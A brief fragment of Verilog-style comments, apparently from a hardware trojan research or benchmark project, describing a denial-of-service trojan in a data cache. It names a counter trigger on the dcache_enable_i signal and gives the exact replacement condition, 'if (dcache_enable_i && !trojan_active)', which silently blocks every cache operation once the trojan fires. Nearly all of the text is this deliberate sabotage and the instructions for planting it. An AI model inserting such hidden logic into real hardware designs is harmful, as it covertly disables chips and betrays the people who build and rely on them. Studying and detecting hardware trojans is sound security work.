 ...
 * 
 * Description:
 *   Disables operations by blocking dcache_enable_i control signal
 *   
 * Trigger: Counter on dcache_enable_i
 * Payload: Block dcache_enable_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block dcache_enable_i when trojan is active
//
// IMPORTANT: dcache_enable_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (dcache_enable_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: dcache_enable_i && 0 = 0 (always false)
//   All operations controlled by dcache_enable_i are blocked
